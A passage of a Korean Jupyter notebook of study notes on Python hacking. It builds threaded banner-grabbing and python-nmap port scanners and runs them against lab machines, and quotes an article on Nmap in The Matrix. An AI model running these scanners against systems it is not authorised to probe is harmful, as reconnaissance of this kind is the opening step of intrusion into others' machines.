      "- \ub098\uc911\uc5d0 \uc0b4\ud3b4\ubcf4\uac8c \ub420 \uac83\uc774\uc9c0\ub9cc, \uc11c\ubc84\uac00 **FreeFloat FTP(\ubc84\uc804 1.00)\ub97c \uc2e4\ud589 \uc911\uc774\ub77c\ub294 \uac83\uc744 \uc544\ub294 \uac83**\uc774 \uc560\ud50c\ub9ac\ucf00\uc774\uc158\uc744 \uacf5\uaca9\ud558\ub294 \ub370 \ub9e4\uc6b0 \uc720\uc6a9\ud558\uac8c \uc791\uc6a9\n",
      "\n",
      "### \uc4f0\ub808\ub4dc \uc0ac\uc6a9\ud558\uae30\n",
      "\n",
      "- \uc18c\ucf13\uc5d0 \uc788\ub294 timeout \ubcc0\uc218\uc5d0 \ub530\ub77c \ub2ec\ub77c\uc9c0\uae30\ub294 \ud558\uc9c0\ub9cc, \uac01 \uc18c\ucf13\uc774 \uc2a4\uce94\uc744 \ud558\ub294 \ub370\ub294 \ubcf4\ud1b5 \uc218 \ucd08\uac00 \uc18c\uc694\ub428\n",
      "- **\uc218 \ucd08**\ub77c\ub294 \ub9d0\uc774 \ubcc4\uac70 \uc544\ub2cc \uac83\ucc98\ub7fc \ubcf4\uc77c \uc218\ub3c4 \uc788\uc9c0\ub9cc **\uc5ec\ub7ec \ud638\uc2a4\ud2b8\ub098 \uc5ec\ub7ec \ud3ec\ud2b8**\ub97c \uc2a4\uce90\ub2dd\ud55c\ub2e4\uba74 \uadf8 \uc2dc\uac04\uc774 \ubaa8\ub450 \ud569\ud574\uc838\uc11c \ubb34\uc2dc\ud560 \uc218 \uc5c6\uc744 \uc815\ub3c4\ub85c \ucee4\uc9d0\n",
      "- \uac00\uc7a5 \uc774\uc0c1\uc801\uc778 \uc0c1\ud669\uc740 \uc18c\ucf13\uc744 \uc21c\ucc28\uc801\uc73c\ub85c \uc2a4\uce94\ud558\ub294 \uac83\ubcf4\ub2e4\ub294 \ub3d9\uc2dc\uc5d0 \uc2a4\uce94\ud558\ub294 \uac83\n",
      "- \uc774\ub97c \uc704\ud574 \ud30c\uc774\uc36c\uc758 \uc4f0\ub808\ub4dc\uc5d0 \ub300\ud574 \uc0b4\ud3b4\ubcfc \uac83\n",
      "- \uc4f0\ub808\ub4dc\ub97c \uc0ac\uc6a9\ud558\uba74 \ub3d9\uc2dc\uc5d0 \uc5ec\ub7ec \uac1c\uc758 \uc791\uc5c5\uc744 \uc2e4\ud589\n",
      "- \uc4f0\ub808\ub4dc\ub97c \uc0ac\uc6a9\ud558\uae30 \uc704\ud574\uc11c\ub294 \uba3c\uc800 portScan() \ud568\uc218\uc5d0 \uc788\ub294 \ubc18\ubcf5\ubb38 \uc218\uc815\n",
      "- connScan \ud568\uc218\ub97c \uc4f0\ub808\ub4dc\ub85c \ud638\ucd9c\ud55c \uac83\uc5d0 \uc720\uc758\n",
      "- \ubc18\ubcf5\ubb38\uc5d0 \uc788\ub294 \uac01 \uc4f0\ub808\ub4dc\ub294 \uc774\uc81c \ub3d9\uc2dc\uc5d0 \uc2e4\ud589\ub418\ub294 \uac83\ucc98\ub7fc \ubcf4\uc77c \uac83"
     ]
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "#### \uc4f0\ub808\ub4dc(\ubd84\uc2e0\uc220)\n",
      "\n",
      "<img src=\"files/images/son_copy.jpg\" />"
     ]
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "# for tgtPort in tgtPorts:\n",
      "#     t = Thread(target=connScan, args=(tgtHost, int(tgtPort)))\n",
      "#     t.start"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [],
     "prompt_number": 8
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "- \uc774 \ubc29\ubc95\uc744 \uc0ac\uc6a9\ud558\uba74 \uc2a4\uce94 \uc18d\ub3c4\ub294 \ub208\uc5d0 \ub744\uac8c \ube68\ub77c\uc9d0\n",
      "- connScan() \ud568\uc218\ub294 \ud654\uba74\uc5d0 \uacb0\uacfc\ub97c \ucd9c\ub825\n",
      "- \ub530\ub77c\uc11c \ub9cc\uc57d \uc5ec\ub7ec \uac1c\uc758 \uc4f0\ub808\ub4dc\uac00 \uacb0\uaca8\uad0e\uc744 \ub3d9\uc2dc\uc5d0 \ud654\uba74\uc5d0 \ucd9c\ub825\ud558\uac8c \ub418\uba74 \uc54c\uc544\ubcf4\uae30 \ud798\ub4e4 \uc218\ub3c4 \uc788\uace0 \uc21c\uc11c\ub3c4 \ub9de\uc9c0 \uc54a\uc744 \uc218\ub3c4 \uc788\ub2e4.\n",
      "- \ud568\uc218\uac00 \ud654\uba74\uc5d0 \ub300\ud55c \uc644\uc804\ud55c \ud1b5\uc81c\uad8c\uc744 \uac00\uc9c8 \uc218 \uc788\uac8c \ud558\uae30 \uc704\ud574\uc11c \uc5ec\uae30\uc11c\ub294 semaphore\ub97c \uc0ac\uc6a9\ud560 \uac83\n",
      "- \uc138\ub9c8\ud3ec\uc5b4\ub97c \uc0ac\uc6a9\ud558\uba74 \ub2e4\ub978 \uc4f0\ub808\ub4dc\uac00 \uc9c4\ud589\ub418\uc9c0 \ubabb\ud558\ub3c4\ub85d lock\uc744 \uac78 \uc218 \uc788\uac8c \ub428\n",
      "- \uc5ec\uae30\uc11c \uc8fc\ubaa9\ud560\uc810\uc740 \ud568\uc218\uc5d0\uc11c \ucd9c\ub825\ud558\uae30 \uc804\uc5d0 screenLock.acquire()\ub97c \uc0ac\uc6a9\ud558\uc5ec \ub77d\uc744 \uc0ac\uc6a9\ud588\ub2e4\ub294 \uac83\n",
      "- \ub9cc\uc57d\uc5d0 \ub77d\uc774 \uc5f4\ub824\uc788\ub2e4\uba74 \uc138\ub9c8\ud3ec\uc5b4\uac00 \ub2e4\uc74c \ub0b4\uc6a9\uc744 \uc9c4\ud589\ud560 \uc218 \uc788\ub3c4\ub85d \uad8c\ud55c\uc744 \ubd80\uc5ec\ud560 \uac83\uc774\uace0 \ud654\uba74\uc5d0 \ucd9c\ub825\uac12\uc744 \ucd9c\ub825\ud560 \uc218 \uc788\uac8c \ub428\n",
      "- \ub9cc\uc57d\uc5d0 \uc7a0\uaca8\uc788\ub2e4\uba74 \uc138\ub9c8\ud3ec\uc5b4\ub97c \uc0ac\uc6a9\ud558\uace0 \uc788\ub294 \uc4f0\ub808\ub4dc\uac00 \ub77d\uc744 \ud574\uc81c\ud560 \ub54c\uae4c\uc9c0 \uae30\ub2e4\ub824\uc57c \ud568\n",
      "- \uc138\ub9c8\ud3ec\uc5b4\ub97c \uc0ac\uc6a9\ud568\uc73c\ub85c\uc368 \ud55c \ubc88\uc5d0 \ud558\ub098\uc758 \uc4f0\ub808\ub4dc\ub9cc\uc774 \ud654\uba74\uc5d0 \ucd9c\ub825\ud560 \uc218 \uc788\ub3c4\ub85d \ub9cc\ub4e4 \uc218 \uc788\uc74c\n",
      "- \uc608\uc678\ucc98\ub9ac \ucf54\ub4dc\uc5d0\uc11c\ub294 finally \ub77c\ub294 \ud0a4\uc6cc\ub4dc\uac00 \ube14\ub85d\uc744 \uc885\ub8cc\ud558\uae30 \uc804\uc5d0 \ub2e4\uc74c \ucf54\ub4dc\ub97c \uc2e4\ud589"
     ]
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "# screenLock = Semaphore(value=1)\n",
      "\n",
      "# def connScan(tgtHost, tgtPort):\n",
      "#     try:\n",
      "#         connSkt = socket(AF_INET, SOCK_STREAM)\n",
      "#         connSkt.connect((tgtHost, tgtPort))\n",
      "#         connSkt.send('e ri python\\r\\n')\n",
      "#         results = connSkt.recv(100)\n",
      "#         screenLock.acquire()\n",
      "#         print '[+] %d/tcp open' % tgtPort\n",
      "#         print '[+] ' + str(results)\n",
      "#     except:\n",
      "#         screenLock.acquire()\n",
      "#         print '[-] %d/tcp closed' % tgtPort\n",
      "#     finally:\n",
      "#         screenLock.release()\n",
      "#         connSkt.close()"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [],
     "prompt_number": 5
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "- \ub2e4\ub978 \ubaa8\ub4e0 \ud568\uc218\ub97c \ub3d9\uc77c\ud55c \uc2a4\ud06c\ub9bd\ud2b8\uc5d0 \ub123\uace0 \uc635\uc158 \ucc98\ub9ac\ub97c \ucd94\uac00\ud558\uba74 \ucd5c\uc885 \uc2a4\uce90\ub108"
     ]
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "%%writefile ch02/get_banner_thread.py\n",
      "import optparse\n",
      "from socket import *\n",
      "from threading import *\n",
      "\n",
      "screenLock = Semaphore(value=1)\n",
      "\n",
      "def connScan(tgtHost, tgtPort):\n",
      "    try:\n",
      "        connSkt = socket(AF_INET, SOCK_STREAM)\n",
      "        connSkt.connect((tgtHost, tgtPort))\n",
      "        connSkt.send('e ri python\\r\\n')\n",
      "        results = connSkt.recv(100)\n",
      "        screenLock.acquire()\n",
      "        print '[+] %d/tcp open' % tgtPort\n",
      "        print '[+] ' + str(results)\n",
      "    except:\n",
      "        screenLock.acquire()\n",
      "        print '[-] %d/tcp closed' % tgtPort\n",
      "    finally:\n",
      "        screenLock.release()\n",
      "        connSkt.close()\n",
      "\n",
      "def portScan(tgtHost, tgtPorts):\n",
      "    try:\n",
      "        tgtIP = gethostbyname(tgtHost)\n",
      "    except:\n",
      "        print \"[-] Cannot resolve '%s': Unknown host\" % tgtHost\n",
      "        return\n",
      "    try:\n",
      "        tgtName = gethostbyaddr(tgtIP)\n",
      "        print '\\n[+] Scan Results for: ' + tgtName[0]\n",
      "    except:\n",
      "        print '\\n[+] Scan Results for: ' + tgtIP\n",
      "        setdefaulttimeout(1)\n",
      "    \n",
      "    for tgtPort in tgtPorts:\n",
      "        t = Thread(target=connScan, args=(tgtHost, int(tgtPort)))\n",
      "        t.start()\n",
      "        \n",
      "def main():\n",
      "    parser = optparse.OptionParser('usage%prog ' +\n",
      "                                   '-H <target host>' +\n",
      "                                   '-p <target port>')\n",
      "    parser.add_option('-H', \n",
      "                      dest='tgtHost', \n",
      "                      type='string',\n",
      "                      help='specify target host')\n",
      "    parser.add_option('-p',\n",
      "                      dest='tgtPort',\n",
      "                      type='string',\n",
      "                      help='specify target port[s] separated by comma')\n",
      "    (options, args) = parser.parse_args()\n",
      "    tgtHost = options.tgtHost\n",
      "    tgtPorts = str(options.tgtPort).split(',')\n",
      "    \n",
      "    if (tgtHost == None) | (tgtPorts[0] == None):\n",
      "        print parser.usage\n",
      "        exit(0)\n",
      "    \n",
      "    portScan(tgtHost, tgtPorts)\n",
      "    \n",
      "if __name__ == '__main__':\n",
      "    main()"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "Overwriting ch02/get_banner_thread.py\n"
       ]
      }
     ],
     "prompt_number": 9
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "!python ch02/get_banner_thread.py -H 192.168.32.159 -p '21, 22, 25, 80'"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "\r\n",
        "[+] Scan Results for: 192.168.32.159\r\n",
        "[-] 22/tcp closed\r\n",
        "[-] 25/tcp closed\r\n",
        "[-] 80/tcp closed\r\n",
        "[+] 21/tcp open\r\n",
        "[+] 220 FreeFloat Ftp Server (Version 1.00)\r",
        "\r\n",
        "\r\n"
       ]
      }
     ],
     "prompt_number": 11
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "<img src=\"files/images/quiz.png\" />\n",
      "#### Quiz\n",
      "\n",
      "- Why occurred error?\n",
      "- \\-p 21, 22, 25, 80"
     ]
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "# !cat ch02/quiz_command_space.txt"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [],
     "prompt_number": 15
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "!python ch02/get_banner_thread.py -H 192.168.32.159 -p 21, 22, 25, 80"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "\r\n",
        "[+] Scan Results for: 192.168.32.159\r\n",
        "Traceback (most recent call last):\r\n",
        "  File \"ch02/get_banner_thread.py\", line 63, in <module>\r\n",
        "    main()\r\n",
        "  File \"ch02/get_banner_thread.py\", line 60, in main\r\n",
        "    portScan(tgtHost, tgtPorts)\r\n",
        "  File \"ch02/get_banner_thread.py\", line 37, in portScan\r\n",
        "    t = Thread(target=connScan, args=(tgtHost, int(tgtPort)))\r\n",
        "ValueError: invalid literal for int() with base 10: ''\r\n",
        "[+] 21/tcp open\r\n",
        "[+] 220 FreeFloat Ftp Server (Version 1.00)\r",
        "\r\n",
        "\r\n"
       ]
      }
     ],
     "prompt_number": 12
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "!python ch02/get_banner_thread.py -H 192.168.32.159 -p 21,22,25,80"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "\r\n",
        "[+] Scan Results for: 192.168.32.159\r\n",
        "[-] 22/tcp closed\r\n",
        "\r\n",
        "[-] 25/tcp closed\r\n",
        "[-] 80/tcp closed\r\n",
        "[+] 21/tcp open\r\n",
        "[+] 220 FreeFloat Ftp Server (Version 1.00)\r",
        "\r\n",
        "\r\n"
       ]
      }
     ],
     "prompt_number": 13
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "### Nmap \ud3ec\ud2b8 \uc2a4\uce90\ub108 \ud1b5\ud569\ud558\uae30\n",
      "\n",
      "- TCP \ucee4\ub125\ud2b8 \uc2a4\uce94\uc744 \uc704\ud55c \uc2a4\ud06c\ub9bd\ud2b8\ub97c \ub9cc\ub4e4\uc5c8\ub2e4. \ud558\uc9c0\ub9cc \uc774 \uc2a4\ud06c\ub9bd\ud2b8\ub294 \uc81c\ud55c\uc801\n",
      "- \uadf8\uc5d0 \ubc18\ud574 \ud3ec\ud2b8 \uc2a4\uce94\uc5d0 \uc788\uc5b4\uc11c \ud669\uae08 \ud45c\uc900\uacfc \uac19\uc740 Nmap\uc740 ACK, RST, FIN, SYN-ACK \ub4f1\uacfc \uac19\uc740 \ub2e4\ub978 \uc885\ub958\uc758 \uc2a4\uce94\uc744 \uc9c0\uc6d0\ud560 \ubfd0\ub9cc \uc544\ub2c8\ub77c \ub2e4\uc591\ud55c \ub2e4\ub978 \uae30\ub2a5\ub3c4 \uc9c0\uc6d0\ud55c\ub2e4\n",
      "- \uc65c \uadf8\ub0e5 Nmap\uc744 \uc0ac\uc6a9\ud558\uc9c0 \uc54a\ub294\uac00? \ubc14\ub85c \uc5ec\uae30\uc11c \ud30c\uc774\uc36c\uc758 \uc9c4\uc815\ud55c \uc544\ub984\ub2e4\uc6c0\uc774 \ubc1c\uc0b0\ub420 \uc218 \uc788\ub2e4\n",
      "- Nmap\uc740 C\uc640 LUA \ud504\ub85c\uadf8\ub798\ubc0d\uc73c\ub85c \uac1c\ubc1c\ud558\uc600\uc9c0\ub9cc \ud30c\uc774\uc36c\uacfc \uad81\ud569\uc774 \uc798 \ub9de\ub294\ub2e4.\n",
      "- Nmap\uc740 \uacb0\uacfc\uac12\uc744 XML \ud615\uc2dd\uc73c\ub85c \uc0dd\uc131\ud558\ub294\ub370, XML \uad6c\ubb38\ubd84\uc11d \ub77c\uc774\ube0c\ub7ec\ub9ac\ub97c \uc0ac\uc6a9\ud558\uc5ec \ud30c\uc774\uc36c\uc5d0\uc11c \uc774 \uac12\uc744 \uc77d\uc5b4\uc62c \uc218 \uc788\uc74c\n",
      "- \uc989, \ud30c\uc774\uc36c\uc73c\ub85c Nmap\uc758 \ubaa8\ub4e0 \uae30\ub2a5\uc744 \uc644\ubcbd\ud558\uac8c \ud65c\uc6a9\ud560 \uc218 \uc788\ub2e4\ub294 \uac83\n",
      "- [python-nmap](http://xael.org/norman/python/python-nmap/): pip\ub85c \uc124\uce58\ud588\uc73c\uba74 \ub530\ub85c \uc124\uce58\ud558\uc9c0 \uc54a\uc544\ub3c4 \ub428\n",
      "\n",
      "#### Using nmap in Matrix\n",
      "\n",
      "<img src=\"files/images/trinity_nmapscreen.jpg\" />"
     ]
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "### [Matrix Sequel Has Hacker Cred](http://www.securityfocus.com/news/4831)\n",
      "\n",
      "Probably the most widely-used freeware hacking tool, the real-life Nmap is a sophisticated port scanner that sends packets to a machine -- or a network of machines -- in an attempt to determine what services are running. An Nmap port scan is a common prelude to an intrusion attempt -- a way of casing the joint, to find out if any vulnerable service are running.\n",
      "\n",
      "That's exactly how the fictional Trinity uses it. In a sequence that flashes on screen for a few scant seconds, the green phosphor text of Trinity's computer clearly shows Nmap being run against the IP address 10.2.2.2, and finding an open port number 22, correctly identified as the SSH service used to log into computers remotely.\n",
      "\n",
      "\"I was definitely pretty excited when I saw it,\" says \"Fyodor,\" the 25-year-old author of Nmap. \"I think compared to previous movies that had any kind of hacking content, you could generally assume it's going to be some kind of stupid 3D graphics show.\"\n",
      "\n",
      "But the unexpected nod to hackerdom doesn't end there. Responding to the Nmap output , Trinity summons a program called **\"sshnuke\" which begins \"[a]ttempting to exploit SSHv1 CRC32.\"**\n",
      "\n",
      "Discovered in February, 2001 by security analyst Michal Zalewski, the SSH CRC-32 bug is a very real buffer overflow in a chunk of code designed to guard against cryptographic attacks on SSH version one. Properly exploited, **it grants full remote access to the vulnerable machine.**\n",
      "\n",
      "\"I think there are at least two public exploits in circulation right now,\" said Zalewski, in a telephone interview. \"They just got released about a month after the advisory. And I know there are some that are not public.\"\n",
      "\n",
      "The actual program Trinity uses is fictitious -- there is no \"sshnuke,\" yet, and genuine exploits sensibly drop the user directly into a root shell, while the big screen version forces the hacker to change the system's root password -- in this case to \"Z1ON0101.\" (Note the numeral in the place of the 'I' -- more hax0r style.)\n",
      "\n",
      "But then, the film does take place in the future. Is Zalewski surprised to see unpatched SSH servers running in the year **AD 2199?** **\"It's not that uncommon for people to run the old distribution,\"** he says. **\"I know we had a bunch of boxes that were unpatched for two years.\"**"
     ]
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "from IPython.display import YouTubeVideo\n",
      "YouTubeVideo('0TJuipCrjZQ')"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "html": [
        "\n",
        "        <iframe\n",
        "            width=\"400\"\n",
        "            height=300\"\n",
        "            src=\"https://www.youtube.com/embed/0TJuipCrjZQ\"\n",
        "            frameborder=\"0\"\n",
        "            allowfullscreen\n",
        "        ></iframe>\n",
        "        "
       ],
       "metadata": {},
       "output_type": "pyout",
       "prompt_number": 83,
       "text": [
        "<IPython.lib.display.YouTubeVideo at 0x10e5aea50>"
       ]
      }
     ],
     "prompt_number": 83
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "#### \ub2e4\ub978 \uc885\ub958\uc758 \ud3ec\ud2b8 \uc2a4\uce94\n",
      "\n",
      "- TCP SYN SCAN: half-open scan. \uc774 \uc885\ub958\uc758 \uc2a4\uce94\uc740 SYN \ud328\ud0b7\uc73c\ub85c\ubd80\ud130 TCP \uc5f0\uacb0\uc744 \uc2dc\uc791\ud558\uace0 \uc751\ub2f5\uc744 \uae30\ub2e4\ub9b0\ub2e4. RST \ud328\ud0b7\uc740 \ud3ec\ud2b8\uac00 \ub2eb\ud600\uc788\ub294 \uac83\uc744 \uc758\ubbf8\ud558\uace0, SYN/ACK\ub294 \uc5f4\ub824\uc788\ub294 \uac83\uc744 \uc758\ubbf8\n",
      "- TCP NULL SCAN: Null scan\uc740 \ud50c\ub798\uadf8 \ud5e4\ub354\ub97c 0\uc73c\ub85c \uc124\uc815. \ub9cc\uc57d RST\ub97c \ubc1b\uc73c\uba74 \ud3ec\ud2b8\uac00 \ub2eb\ud600\uc788\ub294 \uac83\n",
      "- TCP FIN SCAN: TCP FIN scan\uc740 FIN\uc744 \uc804\uc1a1\ud558\uc5ec \ud604\uc7ac \ud65c\uc131\ud654\ub418\uc5b4 \uc788\ub294 TCP \uc5f0\uacb0\uc744 \uc885\ub8cc\uc2dc\ud0a4\ub824\uace0 \ud568. \uadf8\ub9ac\uace0 \uc885\ub8cc\ub418\uae30\ub97c \uae30\ub2e4\ub9bc. \ub9cc\uc57d RST\ub97c \ubc1b\uc73c\uba74 \ud3ec\ud2b8\uac00 \ub2eb\ud600\uc788\ub294 \uac83\uc774\ub2e4.\n",
      "- TCP XMAS SCAN: XMAS \uc2a4\uce94\uc740 PSH, FIN \uadf8\ub9ac\uace0 URG TCP \ud50c\ub798\uadf8\ub97c \ud65c\uc131\ud654\ud55c\ub2e4. \ub9cc\uc57d RST\ub97c \ubc1b\uc73c\uba74 \ud3ec\ud2b8\uac00 \ub2eb\ud600\uc788\ub294 \uac83\n",
      "\n",
      "\n",
      "- PortScanner() \ud074\ub798\uc2a4 \uac1d\uccb4\ub97c \uc0dd\uc131\ud558\uac8c \ub418\uba74 \ud574\ub2f9 \uac1d\uccb4\uc5d0 \uc2a4\uce94\uc744 \uc2e4\ud589\ud560 \uc218 \uc788\uac8c \ub428\n",
      "- PortScanner \ud074\ub798\uc2a4\uc5d0\ub294 scan() \uc774\ub77c\ub294 \ud568\uc218\uac00 \uc788\ub294\ub370, \uc774 \ud568\uc218\ub294 \uacf5\uaca9\ub300\uc0c1\uacfc \uacf5\uaca9\ub300\uc0c1\uc758 \ud3ec\ud2b8\uc758 \ubaa9\ub85d\uc744 \uc785\ub825 \ubc1b\uc544\uc11c \uae30\ubcf8\uc801\uc778 Nmap \uc2a4\uce94\uc744 \uc2e4\uc2dc\n",
      "- \uadf8\ub9ac\uace0 \uac1d\uccb4\ub97c \uacf5\uaca9 \ub300\uc0c1 \ud638\uc2a4\ud2b8\uc640 \ud3ec\ud2b8\ub85c \uc778\ub371\uc2a4\ud654\ud558\uace0 \ud3ec\ud2b8\uc758 \uc0c1\ud0dc\ub97c \ucd9c\ub825\ud568"
     ]
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "import nmap"
     ],
     "language": "python",
     "metadata": {},
     "outputs": []
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "%%writefile ch02/nmap_scan.py\n",
      "import nmap\n",
      "import optparse\n",
      "\n",
      "def nmapScan(tgtHost, tgtPort):\n",
      "    nmScan = nmap.PortScanner()\n",
      "    nmScan.scan(tgtHost, tgtPort)\n",
      "    state = nmScan[tgtHost]['tcp'][int(tgtPort)]['state']\n",
      "    print \" [*] \" + tgtHost + \" tcp/\" + tgtPort + \" \" + state\n",
      "\n",
      "def main():\n",
      "    parser = optparse.OptionParser('usage%prog ' +\n",
      "                                   '-H <target host>' +\n",
      "                                   '-p <target port>')\n",
      "    parser.add_option('-H',\n",
      "                      dest='tgtHost',\n",
      "                      type='string',\n",
      "                      help='specify target host')\n",
      "    parser.add_option('-p',\n",
      "                      dest='tgtPort',\n",
      "                      type='string',\n",
      "                      help='specify target port[s] separated by comma')\n",
      "    \n",
      "    (options, args) = parser.parse_args()\n",
      "    \n",
      "    tgtHost = options.tgtHost\n",
      "    tgtPorts = str(options.tgtPort).split(',')\n",
      "    \n",
      "    if (tgtHost == None) | (tgtPorts[0] == None):\n",
      "        print parser.usage\n",
      "        exit(0)\n",
      "        \n",
      "    for tgtPort in tgtPorts:\n",
      "        nmapScan(tgtHost, tgtPort)\n",
      "        \n",
      "if __name__ == '__main__':\n",
      "    main()"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "Overwriting ch02/nmap_scan.py\n"
       ]
      }
     ],
     "prompt_number": 10
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "!python ch02/nmap_scan.py -H 192.168.32.159 -p '21, 22, 25, 80'"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        " [*] 192.168.32.159 tcp/21 open\r\n"
       ]
      },
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        " [*] 192.168.32.159 tcp/ 22 closed\r\n"
       ]
      },
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        " [*] 192.168.32.159 tcp/ 25 closed\r\n"
       ]
      },
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        " [*] 192.168.32.159 tcp/ 80 closed\r\n"
       ]
      }
     ],
     "prompt_number": 84
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "!nmap 192.168.32.159 -p 21,22,25,80"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "\r\n",
        "Starting Nmap 6.40-2 ( http://nmap.org ) at 2014-06-16 19:24 KST\r\n"
       ]
      },
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "Nmap scan report for 192.168.32.159\r\n",
        "Host is up (0.00024s latency).\r\n",
        "PORT   STATE  SERVICE\r\n",
        "21/tcp open   ftp\r\n",
        "22/tcp closed ssh\r\n",
        "25/tcp closed smtp\r\n",
        "80/tcp closed http\r\n",
        "\r\n",
        "Nmap done: 1 IP address (1 host up) scanned in 0.13 seconds\r\n"
       ]
      }
     ],
     "prompt_number": 22
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "#### windows xp\uc5d0\uc11c \ubc29\ud654\ubcbd \uc124\uc815\ud588\uc744 \ub54c KeyError \ubc1c\uc0dd"
     ]
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "    Traceback (most recent call last):\n",
      "      File \"ch02/nmap_scan.py\", line 36, in <module>\n",
      "        main()\n",
      "      File \"ch02/nmap_scan.py\", line 33, in main\n",
      "        nmapScan(tgtHost, tgtPort)\n",
      "      File \"ch02/nmap_scan.py\", line 7, in nmapScan\n",
      "        state = nmScan[tgtHost]['tcp'][int(tgtPort)]['state']\n",
      "      File \"/Users/re4lfl0w/Library/Enthought/Canopy_64bit/User/lib/python2.7/site-packages/nmap/nmap.py\", line 567, in __getitem__\n",
      "        return self._scan_result['scan'][host]\n",
      "    KeyError: '172.16.190.128'"
     ]
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "#### windows xp\uc5d0\uc11c \ubc29\ud654\ubcbd \uc124\uc815\ud588\uc744 \ub54c nmap in command line"
     ]
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "    nmap 172.16.190.128\n",
      "\n",
      "    Starting Nmap 6.40-2 ( http://nmap.org ) at 2014-06-11 00:00 KST\n",
      "    Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn\n",
      "    Nmap done: 1 IP address (0 hosts up) scanned in 3.06 seconds"
     ]
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "#### Using nmap in command line\n",
      "\n",
      "- nmap\uc758 \uc591\uc2dd\uc73c\ub85c \uacb0\uacfc\uac00 \ub098\uc624\uac8c \ub428"
     ]
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "!nmap 172.16.190.128"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "\r\n",
        "Starting Nmap 6.40-2 ( http://nmap.org ) at 2014-06-11 03:36 KST\r\n"
       ]
      },
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "Nmap scan report for 172.16.190.128\r\n",
        "Host is up (0.12s latency).\r\n",
        "Not shown: 996 closed ports\r\n",
        "PORT    STATE SERVICE\r\n",
        "21/tcp  open  ftp\r\n",
        "135/tcp open  msrpc\r\n",
        "139/tcp open  netbios-ssn\r\n",
        "445/tcp open  microsoft-ds\r\n",
        "\r\n",
        "Nmap done: 1 IP address (1 host up) scanned in 1.26 seconds\r\n"
       ]
      }
     ],
     "prompt_number": 12
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "- \uc11c\ubc84\ub098 \ubc29\ud654\ubcbd\uc774 1720\ubc88 \ud3ec\ud2b8\ub97c \ud544\ud130\ub9c1\ud558\uace0 \uc788\ub2e4\ub294 \uac78 \ud55c \ubc88 \ud655\uc778\ud574 \ubcf4\ub824\uace0 \ubc29\ud654\ubcbd\uc744 \uc5f4\uc5c8\ub2e4 \ub2eb\uc558\ub2e4 \ud574\ubd24\ub294\ub370 \uc798 \uc548\ub418\ub354\ub77c.\n",
      "- \uc5b4\uca0b\ub4e0 \uacb0\ub860\uc740 \ub2e8\uc21c\ud55c TCP \ucee4\ub125\ud2b8 \uc2a4\uce94\ubcf4\ub2e4\ub294 Nmap \uac19\uc740 \uc644\uc804\ud55c \uc2a4\uce90\ub108\ub97c \uc0ac\uc6a9\ud568\uc73c\ub85c\uc368 \ud544\ud130\ub9c1\uc758 \uc874\uc7ac \uc5ec\ubd80\ub97c \ubc1c\uacac\ud560 \uc218 \uc788\uc74c(\ub2f9\uc5f0\ud788 \uba87 \uc2ed\ub144\uc758 \ub178\ud558\uc6b0\uac00 \ucd95\uc801\ub418\uc5b4 \uc788\ub294\ub370..)\n",
      "\n",
      "## \ud30c\uc774\uc36c\uc73c\ub85c SSH \ubd07\ub137 \uad6c\ucd95\ud558\uae30\n",
      "\n",
